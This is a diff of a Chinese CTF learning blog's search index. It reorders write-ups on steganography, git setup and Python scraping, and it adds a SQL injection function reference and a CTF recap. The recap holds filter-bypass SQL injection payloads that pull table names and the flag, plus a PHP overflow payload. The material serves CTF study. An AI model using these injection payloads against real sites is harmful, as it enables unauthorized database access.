-&quot;;s:48: ==&gt; 1
-img ==&gt; L2QwZzNfZmxsbGxsbGFn
-</code></pre>
-<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>V&amp;NCTF2021</title>
-    <url>/posts/6dd4bc92/</url>
-    <content><![CDATA[<blockquote>
-<p>部分wp</p>
-</blockquote>
-<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="冰冰好像藏着什么密码"><a href="#冰冰好像藏着什么密码" class="headerlink" title="冰冰好像藏着什么密码"></a>冰冰好像藏着什么密码</h3><p>先打开图片，报了一堆错，但能正常提取。FFT是快速傅里叶变化的意思，相当于给了提示，补了一些相关知识。</p>
-<p>原理如下，并不是很复杂：</p>
-<p>首先将图片看作信号,</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5BR+%5C+G+%5C+B%5D+=+f(x,y)"></p>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CUMT初夏赛部分wp</title>
     <url>/posts/b061f28/</url>
     <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><blockquote>
@@ -1509,6 +1491,24 @@ for i in s_str:
         print(i_str)
 print(&#39;&#39;.join(flag))
 </code></pre>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>V&amp;NCTF2021</title>
+    <url>/posts/6dd4bc92/</url>
+    <content><![CDATA[<blockquote>
+<p>部分wp</p>
+</blockquote>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="冰冰好像藏着什么密码"><a href="#冰冰好像藏着什么密码" class="headerlink" title="冰冰好像藏着什么密码"></a>冰冰好像藏着什么密码</h3><p>先打开图片，报了一堆错，但能正常提取。FFT是快速傅里叶变化的意思，相当于给了提示，补了一些相关知识。</p>
+<p>原理如下，并不是很复杂：</p>
+<p>首先将图片看作信号,</p>
+<p><img src="https://www.zhihu.com/equation?tex=%5BR+%5C+G+%5C+B%5D+=+f(x,y)"></p>
 ]]></content>
       <categories>
         <category>ctf学习</category>
@@ -1616,33 +1616,6 @@ print(&#39;&#39;.join(flag))
       </categories>
       <tags>
         <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git更新</title>
-    <url>/posts/bc46b23a/</url>
-    <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><blockquote>
-<p>因为vscode ssh要求服务器git得&gt;2,更新了个git，发现push不上去了，又把服务器搞崩了，还得重新配环境。。。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</span><br><span class="line"></span><br><span class="line">yum install  gcc perl-ExtUtils-MakeMaker</span><br><span class="line"></span><br><span class="line">yum remove git</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line"></span><br><span class="line">wget https:&#x2F;&#x2F;mirrors.edge.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">tar -xvf git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">cd git-2.23.0&#x2F;</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install</span><br><span class="line"></span><br><span class="line">echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>开发工具</category>
-      </categories>
-      <tags>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jwt总结</title>
-    <url>/posts/e8e4811b/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1799,6 +1772,33 @@ print(&#39;&#39;.join(flag))
       </tags>
   </entry>
   <entry>
+    <title>git更新</title>
+    <url>/posts/bc46b23a/</url>
+    <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><blockquote>
+<p>因为vscode ssh要求服务器git得&gt;2,更新了个git，发现push不上去了，又把服务器搞崩了，还得重新配环境。。。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</span><br><span class="line"></span><br><span class="line">yum install  gcc perl-ExtUtils-MakeMaker</span><br><span class="line"></span><br><span class="line">yum remove git</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line"></span><br><span class="line">wget https:&#x2F;&#x2F;mirrors.edge.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">tar -xvf git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">cd git-2.23.0&#x2F;</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install</span><br><span class="line"></span><br><span class="line">echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>开发工具</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jwt总结</title>
+    <url>/posts/e8e4811b/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>nextcloud安装及踩坑指南</title>
     <url>/posts/aa5139ab/</url>
     <content><![CDATA[<blockquote>
@@ -1902,24 +1902,6 @@ str + &#39; &#39; # 连接字符串
       </tags>
   </entry>
   <entry>
-    <title>python爬虫深入</title>
-    <url>/posts/3d5e7979/</url>
-    <content><![CDATA[<h2 id="jsonpath"><a href="#jsonpath" class="headerlink" title="jsonpath"></a>jsonpath</h2><p>解决json镶套索引问题</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ 根节点</span><br><span class="line"></span><br><span class="line">. 子节点</span><br><span class="line"></span><br><span class="line">.. 匹配所有子孙节点</span><br><span class="line"></span><br><span class="line">pip install jsonpath</span><br><span class="line"><span class="keyword">from</span> jsonpath <span class="keyword">import</span> jsonpath</span><br><span class="line">jsonpath.(data, &#x27;$.1.2.3.4.5.key&#x27;) -&gt; list</span><br><span class="line">jsonpath.(data, &#x27;$..key&#x27;) -&gt; list</span><br></pre></td></tr></table></figure>
-
-<h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>xpath helper插件</p>
-<p>xpath语法</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">基础语法</span><br><span class="line">//title/text() # 取标签间文本内容</span><br><span class="line">//link/@href   # 提取属性</span><br><span class="line">节点修饰语法</span><br><span class="line">/html/body/div[3]/div[1] # 标签从1开始索引</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>python学习</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python实现校园网自动登录</title>
     <url>/posts/cfeeb04a/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为每次开机都得连校园网，非常的恶心人，所以我用py写了个模拟登录校园网，也是非常的简单，因为只是我自己使用，没考虑推广，我就随便写了写，配置文件啥的都没有，感兴趣的话自己改改代码就行。</p>
@@ -1935,6 +1917,24 @@ str + &#39; &#39; # 连接字符串
 ]]></content>
       <categories>
         <category>python实践</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python爬虫深入</title>
+    <url>/posts/3d5e7979/</url>
+    <content><![CDATA[<h2 id="jsonpath"><a href="#jsonpath" class="headerlink" title="jsonpath"></a>jsonpath</h2><p>解决json镶套索引问题</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ 根节点</span><br><span class="line"></span><br><span class="line">. 子节点</span><br><span class="line"></span><br><span class="line">.. 匹配所有子孙节点</span><br><span class="line"></span><br><span class="line">pip install jsonpath</span><br><span class="line"><span class="keyword">from</span> jsonpath <span class="keyword">import</span> jsonpath</span><br><span class="line">jsonpath.(data, &#x27;$.1.2.3.4.5.key&#x27;) -&gt; list</span><br><span class="line">jsonpath.(data, &#x27;$..key&#x27;) -&gt; list</span><br></pre></td></tr></table></figure>
+
+<h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>xpath helper插件</p>
+<p>xpath语法</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">基础语法</span><br><span class="line">//title/text() # 取标签间文本内容</span><br><span class="line">//link/@href   # 提取属性</span><br><span class="line">节点修饰语法</span><br><span class="line">/html/body/div[3]/div[1] # 标签从1开始索引</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>python学习</category>
       </categories>
       <tags>
         <tag>python</tag>
@@ -2101,6 +2101,19 @@ str + &#39; &#39; # 连接字符串
       </tags>
   </entry>
   <entry>
+    <title>sql注入常用关键字</title>
+    <url>/posts/b65a1db7/</url>
+    <content><![CDATA[<h2 id="常用关键字"><a href="#常用关键字" class="headerlink" title="常用关键字"></a>常用关键字</h2><span id="more"></span>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>database()</span><br><span class="line"></span><br><span class="line">该函数可以显示当前正在使用的数据库库名。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>mid()</span><br><span class="line"></span><br><span class="line">该函数可以从指定的字段中提取出字段的内容。</span><br><span class="line"></span><br><span class="line">mid(column_name,<span class="keyword">start</span>[,length]) # <span class="keyword">start</span>索引值从<span class="number">1</span>开始</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>substr()</span><br><span class="line"></span><br><span class="line">这个函数很常用，有三个参数，按顺序分别是字符串，起始位置和长度。可以求指定字符串的子串。当然，第一个参数可以是列的名字。这个函数似乎和mid没有什么不同，如果mid或者substr中的某一个函数被禁了就用另一个</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>ord()</span><br><span class="line"></span><br><span class="line">该函数用于获得某个字符串最开始的字符的ASCII值。</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>ascii()</span><br><span class="line"></span><br><span class="line">目前未发现与ord的不同。不过这样也有很大好处，那就是，如果<span class="keyword">SQL</span>注入的题目中过滤了<span class="keyword">or</span>，ord函数会躺枪，可以用ascii函数替代。</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> limit <span class="keyword">offset</span> 分页查询需要</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>concat()</span><br><span class="line"></span><br><span class="line">可以将多个字符串连接起来，参数个数无限。但是需要注意的地方就是，如果有一个参数的值是<span class="keyword">NULL</span>，那么整行结果就会返回一个<span class="keyword">NULL</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>group_concat()</span><br><span class="line"></span><br><span class="line">该函数可以将查询结果连成一行，如果只查询一列，默认用逗号分隔；如果查询多列，每一行的查询结果会直接进行字符串连接，行之间默认用逗号分隔。需要注意的是，用于分隔的默认字符可以修改。</span><br><span class="line"><span class="keyword">select</span> group_concat(username,password)<span class="keyword">result</span> <span class="keyword">from</span> users;</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>updatexml()</span><br><span class="line"></span><br><span class="line">这个主要是填写错误的xpath参数使查询报错，报错时会把xpath位置的查询结果暴露出来。如果关了回显的话就不要用这个了，可以考虑时间注入。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">第二个参数由于不符合xpath的规范，会报错。报错的时候会把version()执行的结果报出来，假设查询了flag，错误回显中会出现flag。</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span><span class="keyword">left</span>()</span><br><span class="line"></span><br><span class="line">该函数是一个字符串处理函数，用法实例:</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="string">&#x27;2019&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">返回的结果为：<span class="number">20</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">11.</span><span class="keyword">right</span>()</span><br><span class="line"></span><br><span class="line">这个和<span class="keyword">left</span>对比着记，用法实例：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">right</span>(<span class="string">&#x27;2022&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">返回的结果为：<span class="number">22</span>。</span><br><span class="line"></span><br><span class="line">很明显，substr完全可以取代<span class="keyword">left</span>和<span class="keyword">right</span>两个函数，但是如果substr和mid被禁了，<span class="keyword">left</span>和<span class="keyword">right</span>就可以结合着用。</span><br><span class="line"></span><br><span class="line"><span class="number">12.</span>elt()函数</span><br><span class="line"></span><br><span class="line">elt(n,str1,str2,str3);</span><br><span class="line"></span><br><span class="line">该函数的作用是，返回参数中的第n个字符串,参数可以是字符串常量或者列名。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> elt(<span class="number">2</span>，<span class="string">&#x27;888&#x27;</span>,<span class="string">&#x27;666&#x27;</span>);</span><br><span class="line">其返回的结果是<span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="number">13.</span>sleep()</span><br><span class="line"></span><br><span class="line">该函数的参数是一个整数t，可以在执行某操作后延迟t秒而不进行任何操作。该函数常用于处理没有回显的<span class="keyword">SQL</span>注入，根据响应的时间来确定被注入的<span class="keyword">SQL</span>语句是否执行成功了。</span><br><span class="line"></span><br><span class="line"><span class="number">14.</span>length()</span><br><span class="line"></span><br><span class="line">该函数的参数可以是字符串，或者列名。该函数的作用是获取字符串的长度。比如：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> length(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">15.</span>rand()</span><br><span class="line"></span><br><span class="line">该函数用于产生一个随机数，可以接受一个参数作为种子，也可以直接使用。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> rand();</span><br><span class="line"></span><br><span class="line"><span class="number">16.</span><span class="built_in">floor</span>()</span><br><span class="line"></span><br><span class="line">该函数用于将一个浮点数向下取整得到整数，可以与rand函数配合使用。在特定情况下，rand、floor、<span class="built_in">count</span>(<span class="operator">*</span>)配合<span class="keyword">group</span> <span class="keyword">by</span>可以进行报错注入。</span><br><span class="line"></span><br><span class="line"><span class="number">17.</span><span class="built_in">exp</span>()</span><br><span class="line"></span><br><span class="line">这是一个数学函数，可以求e的多少次幂，当参数过大时会因为溢出<span class="number">2</span>而报错。使用该函数时，通常将查询结果取反以便得到一个非常大的数。用法如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line"></span><br><span class="line"><span class="number">18.</span>hex()</span><br><span class="line"></span><br><span class="line">这个函数主要用于获取字符串对应的十六进制值。用法如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> hex(<span class="string">&#x27;users&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">19.</span><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>是mysql中对查询数据进行排序的方法，后面可以跟列名或者列号（数字），两种写法等价。在<span class="keyword">sql</span>注入中，该关键字经常被用来测试一个表中有多少列，</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> username; </span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vm+kali+docker实现web题复现</title>
     <url>/posts/c52439ad/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github上有很多web题的源码，可以直接下载搭建用于赛后复现，但vps搭建比较繁琐，分配域名，分配目录，分配端口且非常不安全，虚拟机本地搭建就比较简单，而且可以直接通过宿主机访问，如果源码有docker compose的话会更加简单，一键即可搭建。</p>
@@ -2126,19 +2139,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入常用关键字</title>
-    <url>/posts/b65a1db7/</url>
-    <content><![CDATA[<h2 id="常用关键字"><a href="#常用关键字" class="headerlink" title="常用关键字"></a>常用关键字</h2><span id="more"></span>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>database()</span><br><span class="line"></span><br><span class="line">该函数可以显示当前正在使用的数据库库名。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>mid()</span><br><span class="line"></span><br><span class="line">该函数可以从指定的字段中提取出字段的内容。</span><br><span class="line"></span><br><span class="line">mid(column_name,<span class="keyword">start</span>[,length]) # <span class="keyword">start</span>索引值从<span class="number">1</span>开始</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>substr()</span><br><span class="line"></span><br><span class="line">这个函数很常用，有三个参数，按顺序分别是字符串，起始位置和长度。可以求指定字符串的子串。当然，第一个参数可以是列的名字。这个函数似乎和mid没有什么不同，如果mid或者substr中的某一个函数被禁了就用另一个</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>ord()</span><br><span class="line"></span><br><span class="line">该函数用于获得某个字符串最开始的字符的ASCII值。</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>ascii()</span><br><span class="line"></span><br><span class="line">目前未发现与ord的不同。不过这样也有很大好处，那就是，如果<span class="keyword">SQL</span>注入的题目中过滤了<span class="keyword">or</span>，ord函数会躺枪，可以用ascii函数替代。</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> limit <span class="keyword">offset</span> 分页查询需要</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>concat()</span><br><span class="line"></span><br><span class="line">可以将多个字符串连接起来，参数个数无限。但是需要注意的地方就是，如果有一个参数的值是<span class="keyword">NULL</span>，那么整行结果就会返回一个<span class="keyword">NULL</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>group_concat()</span><br><span class="line"></span><br><span class="line">该函数可以将查询结果连成一行，如果只查询一列，默认用逗号分隔；如果查询多列，每一行的查询结果会直接进行字符串连接，行之间默认用逗号分隔。需要注意的是，用于分隔的默认字符可以修改。</span><br><span class="line"><span class="keyword">select</span> group_concat(username,password)<span class="keyword">result</span> <span class="keyword">from</span> users;</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>updatexml()</span><br><span class="line"></span><br><span class="line">这个主要是填写错误的xpath参数使查询报错，报错时会把xpath位置的查询结果暴露出来。如果关了回显的话就不要用这个了，可以考虑时间注入。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">第二个参数由于不符合xpath的规范，会报错。报错的时候会把version()执行的结果报出来，假设查询了flag，错误回显中会出现flag。</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span><span class="keyword">left</span>()</span><br><span class="line"></span><br><span class="line">该函数是一个字符串处理函数，用法实例:</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="string">&#x27;2019&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">返回的结果为：<span class="number">20</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">11.</span><span class="keyword">right</span>()</span><br><span class="line"></span><br><span class="line">这个和<span class="keyword">left</span>对比着记，用法实例：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">right</span>(<span class="string">&#x27;2022&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">返回的结果为：<span class="number">22</span>。</span><br><span class="line"></span><br><span class="line">很明显，substr完全可以取代<span class="keyword">left</span>和<span class="keyword">right</span>两个函数，但是如果substr和mid被禁了，<span class="keyword">left</span>和<span class="keyword">right</span>就可以结合着用。</span><br><span class="line"></span><br><span class="line"><span class="number">12.</span>elt()函数</span><br><span class="line"></span><br><span class="line">elt(n,str1,str2,str3);</span><br><span class="line"></span><br><span class="line">该函数的作用是，返回参数中的第n个字符串,参数可以是字符串常量或者列名。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> elt(<span class="number">2</span>，<span class="string">&#x27;888&#x27;</span>,<span class="string">&#x27;666&#x27;</span>);</span><br><span class="line">其返回的结果是<span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="number">13.</span>sleep()</span><br><span class="line"></span><br><span class="line">该函数的参数是一个整数t，可以在执行某操作后延迟t秒而不进行任何操作。该函数常用于处理没有回显的<span class="keyword">SQL</span>注入，根据响应的时间来确定被注入的<span class="keyword">SQL</span>语句是否执行成功了。</span><br><span class="line"></span><br><span class="line"><span class="number">14.</span>length()</span><br><span class="line"></span><br><span class="line">该函数的参数可以是字符串，或者列名。该函数的作用是获取字符串的长度。比如：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> length(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">15.</span>rand()</span><br><span class="line"></span><br><span class="line">该函数用于产生一个随机数，可以接受一个参数作为种子，也可以直接使用。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> rand();</span><br><span class="line"></span><br><span class="line"><span class="number">16.</span><span class="built_in">floor</span>()</span><br><span class="line"></span><br><span class="line">该函数用于将一个浮点数向下取整得到整数，可以与rand函数配合使用。在特定情况下，rand、floor、<span class="built_in">count</span>(<span class="operator">*</span>)配合<span class="keyword">group</span> <span class="keyword">by</span>可以进行报错注入。</span><br><span class="line"></span><br><span class="line"><span class="number">17.</span><span class="built_in">exp</span>()</span><br><span class="line"></span><br><span class="line">这是一个数学函数，可以求e的多少次幂，当参数过大时会因为溢出<span class="number">2</span>而报错。使用该函数时，通常将查询结果取反以便得到一个非常大的数。用法如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line"></span><br><span class="line"><span class="number">18.</span>hex()</span><br><span class="line"></span><br><span class="line">这个函数主要用于获取字符串对应的十六进制值。用法如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> hex(<span class="string">&#x27;users&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">19.</span><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>是mysql中对查询数据进行排序的方法，后面可以跟列名或者列号（数字），两种写法等价。在<span class="keyword">sql</span>注入中，该关键字经常被用来测试一个表中有多少列，</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> username; </span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2222,7 +2222,7 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
 <h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
 <p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
 <blockquote>
-<p>邮箱： <a href="mailto:&#x69;&#107;&#97;&#101;&#107;&#107;&#x6b;&#64;&#x64;&#105;&#110;&#x67;&#116;&#x61;&#x6c;&#107;&#46;&#99;&#111;&#x6d;">&#x69;&#107;&#97;&#101;&#107;&#107;&#x6b;&#64;&#x64;&#105;&#110;&#x67;&#116;&#x61;&#x6c;&#107;&#46;&#99;&#111;&#x6d;</a></p>
+<p>邮箱： <a href="mailto:&#x69;&#x6b;&#97;&#101;&#x6b;&#107;&#107;&#x40;&#x64;&#x69;&#x6e;&#x67;&#x74;&#97;&#x6c;&#x6b;&#x2e;&#99;&#111;&#109;">&#x69;&#x6b;&#97;&#101;&#x6b;&#107;&#107;&#x40;&#x64;&#x69;&#x6e;&#x67;&#x74;&#97;&#x6c;&#x6b;&#x2e;&#99;&#111;&#109;</a></p>
 </blockquote>
 ]]></content>
       <categories>
@@ -2280,6 +2280,37 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初夏赛复盘</title>
+    <url>/posts/63fc7f18/</url>
+    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql_inject"></a>sql_inject</h2><blockquote>
+<p>过滤绕过</p>
+</blockquote>
+<p>|| 代替 or</p>
+<p>!(a&lt;&gt;a) 代替 =</p>
+<p>/**/ 代替 空格</p>
+<p>mid 代替 left right substr</p>
+<p>3’/<strong>/||/</strong>/!(1&lt;&gt;1)#</p>
+<p>3’/<strong>/||/</strong>/!(database()&lt;&gt;’cumtctf’)#</p>
+<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,1)&lt;&gt;’f’)#;</p>
+<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,34)&lt;&gt;’flag_table,no_use_table,test,users’)#;</p>
+<p>无列名注入这个有点离谱<br>直接把flag给试出来了？？？</p>
+<p>1’/<strong>/||/</strong>/(select/<strong>/(‘flag{cumtctf_sql_is_s0_e@sy}’,0)&gt;(select/</strong>/*/<strong>/from/</strong>/flag_table/<strong>/limit/</strong>/1,1));#</p>
+<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>php在64位系统中，当索引大小为9223372036854775808会溢出</p>
+<pre><code>payload:web=flag&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806
+</code></pre>
+<p>jphide:</p>
+<p>这个有GUI界面不用命令输入密码就行。</p>
+<h2 id="RCE-Me"><a href="#RCE-Me" class="headerlink" title="RCE_Me"></a>RCE_Me</h2>]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>sql注入</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -2361,6 +2392,35 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
+    <title>国庆赛部分赛题复现</title>
+    <url>/posts/bfdb9200/</url>
+    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
+<p>环境有点问题，复现一半出不来了</p>
+</blockquote>
